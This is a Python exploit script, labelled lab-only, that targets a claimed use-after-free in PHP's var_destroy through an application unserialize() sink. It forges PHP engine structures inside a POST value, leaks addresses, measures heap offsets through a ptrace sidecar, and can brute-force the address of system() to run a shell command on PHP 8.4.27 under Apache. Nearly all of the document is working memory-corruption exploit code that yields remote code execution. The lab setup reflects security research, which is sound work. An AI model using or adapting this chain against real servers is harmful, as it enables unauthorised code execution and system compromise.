#!/usr/bin/env python3
"""LAB-ONLY end-to-end carrier-in-input exploit for the var_destroy re-entry
UAF, delivered through an application unserialize() sink (no vd.php).

The forged carrier lives INSIDE the application-controlled POST string
($_POST['p']), at a fixed offset for a fixed request shape; the spray token
is the object's own `key` property. The lab sink/gadget is
poc/app_unserialize_sink.php (mount it as /app.php); P2S_FRONT points at the
directory holding it for the measurement step.

Measured quantities:
  delta_v = address($_POST['p'] value string) - main   (fresh worker)
  carrier = delta_v + DOFF                              (forged blob in string)
"""
import argparse, base64, json, os, re, socket, subprocess, sys, threading, time, urllib.parse, urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
FRONT = os.environ.get(
    "P2S_FRONT",
    "/private/var/folders/59/372ydp210wzbvvbgwktc6nmr0000gn/T/opencode/research/front-webroot")

MAGIC = b"CARRIERMAGIC0000"
MOFF = 0x800
CARRIER_LEN = 0x1000
OFF_ZVAL, OFF_REF, OFF_OBJ, OFF_HT, OFF_STR = 0x100, 0x200, 0x300, 0x400, 0x500
CMD = b"id>/tmp/vd 2>&1"
IS_STRING, IS_OBJECT, IS_REFERENCE = 6, 8, 10
GC_REFERENCE = 26
IS_TYPE_REFCOUNTED = 1
ZSHIFT = 8
ZEND_CALL_ARG1_OFF = 80

PREFIX = b'a:1018:{i:0;s:4096:"'
DOFF = len(PREFIX)

def p8(buf, off, val): buf[off:off+8] = (val & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
def p4(buf, off, val): buf[off:off+4] = (val & 0xFFFFFFFF).to_bytes(4, "little")

def build_value(carrier, zif, key_ptr, blob_fill=b"\x00"):
    """Return the serialized POST value string with the forged carrier at DOFF."""
    blob = bytearray(blob_fill * CARRIER_LEN)
    C = carrier
    fake_zval, fake_ref = C + OFF_ZVAL, C + OFF_REF
    fake_obj, fake_ht, fake_str = C + OFF_OBJ, C + OFF_HT, C + OFF_STR
    p8(blob, OFF_ZVAL+0, fake_ref)
    p4(blob, OFF_ZVAL+8, IS_REFERENCE | (IS_TYPE_REFCOUNTED << ZSHIFT))
    p4(blob, OFF_ZVAL+12, 0)
    p4(blob, OFF_REF+0, 0)
    p4(blob, OFF_REF+4, GC_REFERENCE)
    p8(blob, OFF_REF+8, fake_obj)
    p4(blob, OFF_REF+16, IS_OBJECT | (IS_TYPE_REFCOUNTED << ZSHIFT))
    p4(blob, OFF_REF+20, 0)
    p8(blob, OFF_REF+24, 0)
    p4(blob, OFF_OBJ+0, 1)
    p4(blob, OFF_OBJ+4, IS_OBJECT)
    p4(blob, OFF_OBJ+8, 0)
    p8(blob, OFF_OBJ+16, 0)
    p8(blob, OFF_OBJ+24, fake_ht)
    p8(blob, OFF_OBJ+32, 0)
    p4(blob, OFF_OBJ+40, 0)
    p4(blob, OFF_OBJ+44, 1)
    p8(blob, OFF_OBJ+48, 0)
    p8(blob, OFF_OBJ+56, 0)
    p8(blob, OFF_OBJ+64, 0)
    p8(blob, OFF_OBJ+72, 0)
    p8(blob, OFF_OBJ+ZEND_CALL_ARG1_OFF+0, fake_str)
    p4(blob, OFF_OBJ+ZEND_CALL_ARG1_OFF+8, IS_STRING)
    p4(blob, OFF_OBJ+ZEND_CALL_ARG1_OFF+12, 0)
    p4(blob, OFF_HT+0, 0)
    p8(blob, OFF_HT+8, 0)
    p8(blob, OFF_HT+16, zif)
    p4(blob, OFF_STR+0, 0xFFFFFFFF)
    p4(blob, OFF_STR+4, IS_STRING)
    p8(blob, OFF_STR+8, 0)
    p8(blob, OFF_STR+16, len(CMD))
    blob[OFF_STR+24:OFF_STR+24+len(CMD)] = CMD
    tail = (b'";' + b'i:0;N;' * 1015 +
            b'i:99999;O:10:"CachePurge":1:{s:3:"key";s:8:"' +
            key_ptr + b'";}i:99999;i:42;}')
    return PREFIX + bytes(blob) + tail

def final_len():
    return len(build_value(0, 0, b"\x00"*8, blob_fill=b"A"))

def sh(container, cmd, timeout=90):
    return subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                          capture_output=True, text=True, timeout=timeout)

def http_body(host, port, path, body, timeout=30):
    s = socket.create_connection((host, port), timeout=timeout)
    req = (f"POST {path} HTTP/1.1\r\nHost: x\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    s.sendall(req); s.settimeout(timeout); out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            out += d
    except socket.timeout:
        pass
    s.close(); return out

BOUND = b"----vdlabcarrierboundary"

def http_multipart(host, port, path, value, timeout=30):
    body = (b"--" + BOUND + b"\r\n"
            b'Content-Disposition: form-data; name="p"\r\n\r\n' +
            value + b"\r\n--" + BOUND + b"--\r\n")
    s = socket.create_connection((host, port), timeout=timeout)
    req = (f"POST {path} HTTP/1.1\r\nHost: x\r\n"
           f"Content-Type: multipart/form-data; boundary={BOUND.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    s.sendall(req); s.settimeout(timeout); out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            out += d
    except socket.timeout:
        pass
    s.close(); return out

def leak_main(host, port, path="/eval.php"):
    code = open(__file__.rsplit("/", 1)[0] + "/verify_vardestroy_xpathleak.php", encoding="utf-8").read()
    code = re.sub(r"^\s*<\?php", "", code)
    body = urllib.parse.urlencode({"c": base64.b64encode(code.encode()).decode()}).encode()
    req = urllib.request.Request(f"http://{host}:{port}{path}", body,
                                 {"Content-Type": "application/x-www-form-urlencoded"})
    text = ""
    for _ in range(12):
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                text = r.read().decode("latin-1")
            break
        except Exception:
            time.sleep(0.4)
    m = re.search(r"main=([0-9a-f]+)", text)
    if not m: raise SystemExit(f"no leak: {text[:200]!r}")
    return int(m.group(1), 16)

def reset_worker(container):
    sh(container, "for p in $(pgrep -f 'apache2 -DFOREGROUND'); do "
                  "[ \"$p\" != 1 ] && kill -9 $p 2>/dev/null; done; true")
    time.sleep(0.8)

def sidecar(container, script, *args, timeout=120):
    return subprocess.run(["docker", "run", "--rm", f"--pid=container:{container}",
                           "--cap-add=SYS_PTRACE", "--security-opt", "seccomp:unconfined",
                           "-v", f"{FRONT}:/w:ro", "php:8.4.27-apache",
                           "php", f"/w/{script}", *map(str, args)],
                          capture_output=True, text=True, timeout=timeout)

def measure_delta(host, port, container, vlen, moff=MOFF, reset=True):
    if reset:
        reset_worker(container)
    sh(container, "rm -f /tmp/meas_pid")
    val = bytearray(build_value(0, 0, b"\x00"*8, blob_fill=b"A"))
    assert len(val) == vlen
    val[moff-8:moff] = b"\x00"*8
    val[moff:moff+32] = MAGIC*2
    th = {}
    t = threading.Thread(target=lambda: th.setdefault("r", http_multipart(host, port, "/meas.php", bytes(val))), daemon=True)
    t.start()
    pid = ""
    for _ in range(60):
        pid = sh(container, "cat /tmp/meas_pid 2>/dev/null").stdout.strip()
        if pid: break
        time.sleep(0.1)
    if not pid: raise SystemExit("no pid")
    r = sidecar(container, "scan_value.php", pid, (MAGIC*2).hex(), vlen, moff)
    t.join(timeout=30)
    if not r.stdout.strip():
        print(f"[dbg] pid={pid} rc={r.returncode} err={r.stderr!r} len={vlen} moff={moff}")
    hits = []
    for line in r.stdout.splitlines():
        parts = line.split()
        hits.append((int(parts[0], 16), line))
    # refcount=2 is the string held by both $_POST and the local $p
    rc2 = [a for a, rest in hits if "refcount=2" in rest]
    rc1 = [a for a, rest in hits if "refcount=1" in rest]
    return rc2, rc1, pid

def boom(host, port, container, payload, proof="/tmp/vd"):
    sh(container, f"rm -f {proof} /tmp/appdbg")
    resp = http_multipart(host, port, "/app.php", payload, timeout=20)
    time.sleep(0.6)
    out = sh(container, f"cat {proof} 2>/dev/null").stdout
    return out, resp

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18180")
    ap.add_argument("--container", default="s1-8427")
    ap.add_argument("--build", default="8.4.27")
    ap.add_argument("--zif-off", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lib", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--delta", type=lambda x: int(x, 0), default=None,
                    help="value-string delta (skip measurement)")
    ap.add_argument("--no-reset", action="store_true")
    ap.add_argument("--scan-zif", action="store_true",
                    help="recover zif by scanning 64K libphp slots (no /proc)")
    ap.add_argument("--zmax", type=int, default=256)
    ap.add_argument("--key-ptr", type=lambda x: int(x, 0), default=None,
                    help="override spray token pointer")
    ap.add_argument("mode", choices=["len", "measure", "fire", "run"])
    args = ap.parse_args()
    host, _, port = args.target.partition(":"); port = int(port or 80)
    L = final_len()
    if args.mode == "len":
        print(f"value_len={L:#x} ({L}) DOFF={DOFF:#x}")
        return 0
    print(f"[*] target {args.target} container {args.container} build {args.build}")
    print(f"[*] value_len={L:#x} DOFF={DOFF:#x}")

    delta = args.delta
    if args.mode in ("measure", "run"):
        rc2, rc1, pid = measure_delta(host, port, args.container, L, reset=not args.no_reset)
        print(f"[m] pid={pid} value-string hits: refcount2={[hex(a) for a in rc2]} refcount1={[hex(a) for a in rc1]}")
        if not rc2:
            print("[!] no refcount=2 value string"); return 1
        delta = rc2[0]
    if args.mode == "measure":
        main = leak_main(host, port)
        print(f"[m] main={main:#x} delta_v={delta-main:#x} carrier_delta={delta-main+DOFF:#x}")
        return 0
    if delta is None:
        print("[!] --delta required"); return 1

    main = leak_main(host, port)
    delta_off = delta - main if delta > main else delta
    carrier = main + delta_off + DOFF
    print(f"[*] main={main:#x} delta_v={delta_off:#x} carrier={carrier:#x}")

    if args.scan_zif:
        ok = None
        t0 = time.time()
        for j in range(args.zmax):
            z = main + 0x2000000 + j * 0x10000 + 0x431510
            key = carrier + OFF_ZVAL
            pl = build_value(carrier, z, key.to_bytes(8, "little"))
            out, resp = boom(host, port, args.container, pl)
            if "uid=" in out:
                print(f"[EVIDENCE] zif scan j={j} attempts={j+1} zif={z:#x} ({time.time()-t0:.1f}s)\n{out.strip()}")
                return 0
            reset_worker(args.container)
        print("[!] zif not found in scan window")
        return 1

    zif = None
    if args.zif_off is not None:
        if args.lib is None:
            pid = sh(args.container, "pgrep -f 'apache2 -DFOREGROUND' | grep -v '^1$' | tail -1").stdout.strip()
            lib = int(sh(args.container, f"grep libphp /proc/{pid}/maps | head -1 | cut -d- -f1").stdout.strip(), 16)
        else:
            lib = args.lib
        zif = lib + args.zif_off
        print(f"[*] libphp={lib:#x} zif_system={zif:#x}")
    if zif is None:
        raise SystemExit("provide --zif-off (and optionally --lib)")
    key_ptr = args.key_ptr if args.key_ptr is not None else carrier + OFF_ZVAL
    payload = build_value(carrier, zif, (key_ptr).to_bytes(8, "little"))
    print(f"[*] spray token={key_ptr:#x} payload_len={len(payload):#x}")
    if len(payload) != L:
        print("[!] payload length drift"); return 1
    out, resp = boom(host, port, args.container, payload)
    print(f"[*] response={resp.split(b'\r\n',1)[0].decode('latin1','replace') if resp else '<none>'}")
    if "uid=" in out:
        print(f"[EVIDENCE] terminal call via app sink + input-string carrier:\n{out.strip()}")
        return 0
    print(f"[!] no proof; /tmp/vd={out.strip()!r}")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
